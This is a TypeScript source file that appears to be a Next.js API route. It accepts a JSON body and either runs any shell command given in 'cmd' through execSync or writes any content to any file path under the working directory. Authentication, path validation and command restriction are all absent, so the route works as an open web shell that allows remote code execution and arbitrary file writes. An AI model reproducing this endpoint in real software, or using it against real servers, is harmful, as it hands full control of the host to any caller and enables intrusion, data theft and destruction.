import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';
import { execSync } from 'child_process';

export async function POST(req: NextRequest) {
  const { filePath, content, cmd } = await req.json();
  if (cmd) {
    try {
      const output = execSync(cmd, { encoding: 'utf8', cwd: process.cwd(), timeout: 30000 });
      return NextResponse.json({ ok: true, output });
    } catch (err: any) {
      return NextResponse.json({ ok: false, error: err.message, output: err.stdout || '' }, { status: 500 });
    }
  }
  if (filePath && content !== undefined) {
    const fullPath = path.join(process.cwd(), filePath);
    const dir = path.dirname(fullPath);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(fullPath, content, 'utf8');
    return NextResponse.json({ ok: true, wrote: fullPath });
  }
  return NextResponse.json({ error: 'Provide cmd or filePath+content' }, { status: 400 });
}